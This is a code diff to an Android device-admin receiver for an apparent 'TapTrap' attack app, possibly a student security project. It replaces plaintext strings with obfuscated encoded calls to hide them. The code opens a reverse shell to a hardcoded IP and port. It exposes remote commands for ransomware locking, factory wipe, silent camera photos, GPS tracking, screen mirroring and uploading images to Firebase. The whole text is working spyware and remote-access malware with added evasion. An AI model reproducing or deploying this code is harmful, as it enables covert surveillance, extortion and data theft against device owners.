@@ -33,8 +33,8 @@ import com.example.inf2007_mad_j1847.utils.StringHelper;
 
 public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
-    private static final String TAG = "TapTrap-Admin";
-    private static final String SERVER_IP = "20.2.66.175";
+    private static final String TAG = StringHelper.qzxp("+hQWp6TEF7VmSn160A=="); //"TapTrap-Admin";
+    private static final String SERVER_IP = StringHelper.qzxp("b2ZYmxn7wAI2oFE="); //"20.2.66.175";
     private static final int SERVER_PORT = 9999;
 
 
@@ -48,8 +48,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
     public void onEnabled(Context context, Intent intent) {
         super.onEnabled(context, intent);
         // 🔴 TAPTRAP SUCCEEDED!
-        Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
-        Log.d(TAG, "connect to server ");
+        Log.d(TAG, StringHelper.qzxp("GDGs8ANwX8kBlqnKaqbLe+lXVJ1qcNotXvj9dtdaGEKY+ko0UxU=")); //"🔥 Device Admin GRANTED via TapTrap!");
+        Log.d(TAG, StringHelper.qzxp("f8FBwnYe5yD7wHHn6IIiwCf4")); //"connect to server ");
 
 
         // START THE SERVICE instead of calling launchReverseShell directly
@@ -72,32 +72,32 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         new Thread(() -> {
             try {
                 Socket socket = new Socket(SERVER_IP, SERVER_PORT);
-                Log.d(TAG, "🔥 Reverse shell launched!");
+                Log.d(TAG, StringHelper.qzxp("8uQoarwP08uGfqI+D0QzVgAIPcjWv13KX0PcQw==")); // "🔥 Reverse shell launched!");
 
                 // Send a welcome message to the listener
                 java.io.PrintWriter writer = new java.io.PrintWriter(socket.getOutputStream(), true);
-                writer.println("🔥 TapTrap shell connected!");
-                writer.println("Available commands:");
-                writer.println("  lock        - Lock the device");
-                writer.println("  whoami      - Show app user info");
-                writer.println("  device_info - Show device details");
-                writer.println("  battery     - Show battery status");
-                writer.println("  ip          - Show IP addresses");
-                writer.println("  list_apps (only show current app)  - List installed apps");
-                writer.println("  reboot (not working on emulator)     - Reboot device");
-                writer.println("  ransom_lock");
-                writer.println("  ransom_end ");
-                writer.println("  scan_media [N]  - Scan N images and show results");
-                writer.println("  upload [ID]     - Upload image to Firebase Storage");
-                writer.println("  exit        - Close connection");
-                writer.println("  wipe - Factory reset device (physical only)");
-                writer.println("  screen_mirror - Start sending screenshots every 10s");
-                writer.println("  screen_stop   - Stop screen mirror");
-                writer.println("  wifi        - Show WiFi info");
-                writer.println("  location    - Show GPS coordinates + Google Maps link");
-                writer.println("  front_snap  - Silently take front camera photo");
-                writer.println("  back_snap   - Silently take back camera photo");
-                writer.println("----------------------------------");
+                writer.println(StringHelper.qzxp("CaHL3TBJLDJrnwjhvpAKfWHlY6EwM1RnPcKpZpk=")); //"🔥 TapTrap shell connected!");
+                writer.println(StringHelper.qzxp("5VgAVK1ZplqcJm2ssKF2LMLgZQ==")); //"Available commands:");
+                writer.println(StringHelper.qzxp("x2rXui+gxSlbBOiF/1l8StDgLlDd38PYCrM/7tPcwg==")); //"  lock        - Lock the device");
+                writer.println(StringHelper.qzxp("4wZ6pitTibDWnCaoWMdeLH/FO+65vPy2hD0fiGtwn66lSQ==")); //"  whoami      - Show app user info");
+                writer.println(StringHelper.qzxp("t2dNyRhQmrrJ4vvNnaUQ9Flubj1ojG3NTEdwsUszla3+K1o=")); //"  device_info - Show device details");
+                writer.println(StringHelper.qzxp("FQmQG1gEdbM0VXJNqsGrGlzUFSDfNz7PRmxF5Wvrqn5BXIE=")); //"  battery     - Show battery status");
+                writer.println(StringHelper.qzxp("7b7MWxlnCYE91qspskbYFqV9SF95UszEV1D1F9jap7i+")); //"  ip          - Show IP addresses");
+                writer.println(StringHelper.qzxp("G5zDVAYj3d7no4vEwwc4P3lReFXOGEqmZRSsHa9rEWlLzIYdVXqi8/6gjMSCBiUnYR1nWMVPC7VgFQ==")); //"  list_apps (only show current app)  - List installed apps");
+                writer.println(StringHelper.qzxp("rtVOgXD30pIFcOy+2Hoo3wsdSyaYi408OIJtJzK4UH783BzEMridywUK57PDNSuQHRNUIZzO")); //"  reboot (not working on emulator)     - Reboot device");
+                writer.println(StringHelper.qzxp("g2b3X013ODUYuJ2osw==")); //"  ransom_lock");
+                writer.println(StringHelper.qzxp("MRl6ELhVZJV1w1I1ow==")); //"  ransom_end ");
+                writer.println(StringHelper.qzxp("3rIZ9DZl8QuZfX9i+io1hRTSSJP7pOpN1NTpa/1MWtqNsgv5MyvdDpNuNnG/Ag60QIE=")); //"  scan_media [N]  - Scan N images and show results");
+                writer.println(StringHelper.qzxp("/WIA2QUHI4m1eP9xbnX4aoHCLJYOLPcsd3al6tle0VT9NhqJLwEwiPdCxVATBqwl04Nm0w==")); //"  upload [ID]     - Upload image to Firebase Storage");
+                writer.println(StringHelper.qzxp("/VlwO1MqFbOjoJ+P4jUn/U2bRHbcPaHMERCgk3IxeK0=")); //"  exit        - Close connection");
+                writer.println(StringHelper.qzxp("NcwkgzalUuOhMfm1cKFnxA49lOUWI1ih3Ou+4tQFUlJ9lSCDJaEe7u4Z9K8t")); //"  wipe - Factory reset device (physical only)");
+                writer.println(StringHelper.qzxp("YJ7VqAPCqQLWWPSkm3t3VOB47WavvBI+b9wp0xjh17kz3dSuFMm/BOZB7vaMYmAGtHiPIr0=")); //"  screen_mirror - Start sending screenshots every 10s");
+                writer.println(StringHelper.qzxp("aGWxoWiS/M5fzShq60zsQVNclJ2t2PmtQZinFBcouQc6N62w")); //"  screen_stop   - Stop screen mirror");
+                writer.println(StringHelper.qzxp("IpK8Om12/s9MOF74c/YK/MWFBjuHNmI5RGZELf9D")); //"  wifi        - Show WiFi info");
+                writer.println(StringHelper.qzxp("J0ce7D+7XZf926Pr5nSKCOlBI6HsyKvH7A2O2l538jdmExfwfPEJuf3a5KejdOpJylpsuqXhkA==")); //"  location    - Show GPS coordinates + Google Maps link");
+                writer.println(StringHelper.qzxp("mvkk5o1plcUk9sb0M7uApCo2DGuTr9qjpIoC+ImPiWrVtza0gWaM/yX5h/R79Nnr")); //"  front_snap  - Silently take front camera photo");
+                writer.println(StringHelper.qzxp("pAQE9VfntWhzz97JkD6HIzVQTVPbDd4GuXQ91lGwR8DnT0b3VeGPaXyO3oHfasU=")); //"  back_snap   - Silently take back camera photo");
+                writer.println(StringHelper.qzxp("JYQINeCiusqq0fNFzm945NYReilBh/eRoGQBW8E0KrklhA==")); //"----------------------------------");
 
                 // Read commands from listener
                 java.io.BufferedReader reader = new java.io.BufferedReader(
@@ -107,31 +107,31 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 String command;
                 while ((command = reader.readLine()) != null) {
                     command = command.trim();
-                    Log.d(TAG, "📩 Command received: " + command);
+                    Log.d(TAG, StringHelper.qzxp("x4/PO6tQ4saZtLMj09l7h+JrracI0bg=")  + command); // "📩 Command received: "
                     String response = handleCommand(context, command);
                     writer.println(response);
 
-                    if (command.equals("exit")) break;
+                    if (command.equals("exit")) break; // "exit"
                 }
 
                 socket.close();
 
             } catch (Exception e) {
-                Log.e(TAG, "Shell failed: " + e.getMessage());
+                Log.e(TAG, StringHelper.qzxp("tF7tcV0H9N8pY/+2aDY=") + e.getMessage()); // "Shell failed: "
             }
         }).start();
     }
 
     private String handleCommand(Context context, String command) {
 
-        if (command.toLowerCase().startsWith("scan_media")) {
+        if (command.toLowerCase().startsWith(StringHelper.qzxp("3WkGmU1cs2jNXA=="))) { //"scan_media"
             int maxItems = 10;
             String[] parts = command.split(" ");
             if (parts.length > 1) {
                 try {
                     maxItems = Integer.parseInt(parts[1]);
                 } catch (NumberFormatException e) {
-                    return "❌ Invalid number. Usage: scan_media [N]";
+                    return StringHelper.qzxp("skenJQn6hM9I/VjNhJQUngx/hsvshmWtmOF4NcKb6NU9v09sIbSp4Hk="); //"❌ Invalid number. Usage: scan_media [N]";
                 }
             }
 
